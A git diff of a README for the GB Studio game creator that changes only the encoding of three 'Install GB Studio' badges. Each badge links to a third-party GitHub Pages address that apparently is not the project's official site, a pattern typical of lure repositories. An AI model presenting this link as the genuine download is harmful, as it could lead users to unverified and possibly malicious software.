@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ GB Studio is a free, drag-and-drop game creator for building Game Boy-style game
 
 <div align="center">
 
-[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ GB Studio is a free, drag-and-drop game creator for building Game Boy-style game
 
 <div align="center">
 
-[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB%20Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install GB Studio](https://img.shields.io/badge/⬇_Install_GB+Studio-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
